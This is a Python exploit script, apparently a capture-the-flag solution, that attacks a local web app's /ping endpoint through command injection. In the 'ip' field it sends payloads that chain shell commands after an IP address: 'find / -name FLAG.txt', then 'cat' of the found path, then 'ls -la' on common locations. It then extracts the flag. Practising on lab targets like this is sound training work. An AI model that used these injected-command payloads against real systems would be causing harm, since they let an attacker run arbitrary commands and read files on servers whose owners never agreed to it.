import requests
import re

base_url = "http://127.0.0.1:33159"
endpoint = "/ping"

print("[*] Exploiting command injection in /ping endpoint")
print("[*] Step 1: Locating FLAG.txt on filesystem")

# Payload to find FLAG.txt location
# Using find command to search entire filesystem
find_payload = "127.0.0.1; find / -name FLAG.txt 2>/dev/null"

try:
    response = requests.post(
        f"{base_url}{endpoint}",
        data={"ip": find_payload},
        timeout=10
    )
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Body:\n{response.text}")
    
    # Look for FLAG.txt path in response
    flag_path_match = re.search(r'(/[^\s]+FLAG\.txt)', response.text)
    
    if flag_path_match:
        flag_path = flag_path_match.group(1)
        print(f"\n[!] FLAG.txt found at: {flag_path}")
        print("[*] Step 2: Extracting flag content")
        
        # Payload to read the flag file
        cat_payload = f"127.0.0.1; cat {flag_path}"
        
        flag_response = requests.post(
            f"{base_url}{endpoint}",
            data={"ip": cat_payload},
            timeout=10
        )
        
        print(f"[+] Flag extraction response status: {flag_response.status_code}")
        print(f"[+] Flag extraction response:\n{flag_response.text}")
        
        # Extract FLAG{...} pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', flag_response.text)
        if flag_match:
            print(f"\n[+] FLAG FOUND: {flag_match.group(0)}")
        else:
            print("[-] Flag pattern not found in response")
    else:
        print("[-] FLAG.txt location not found in response")
        print("[*] Trying alternative location checks...")
        
        # Try checking common locations directly
        common_locations = ["/FLAG.txt", "/root/FLAG.txt", "/tmp/FLAG.txt", "/var/FLAG.txt"]
        for location in common_locations:
            check_payload = f"127.0.0.1; ls -la {location} 2>&1"
            check_response = requests.post(
                f"{base_url}{endpoint}",
                data={"ip": check_payload},
                timeout=10
            )
            
            if "FLAG.txt" in check_response.text or "No such file" not in check_response.text:
                print(f"[+] Checking {location}:")
                print(check_response.text)
                
                # If file exists, try to read it
                if "FLAG.txt" in check_response.text:
                    read_payload = f"127.0.0.1; cat {location}"
                    read_response = requests.post(
                        f"{base_url}{endpoint}",
                        data={"ip": read_payload},
                        timeout=10
                    )
                    
                    flag_match = re.search(r'FLAG\{[^}]+\}', read_response.text)
                    if flag_match:
                        print(f"\n[!] FLAG FOUND at {location}: {flag_match.group(0)}")
                        break
        
except requests.exceptions.RequestException as e:
    print(f"[-] Request error: {e}")
except Exception as e:
    print(f"[-] Error: {e}")
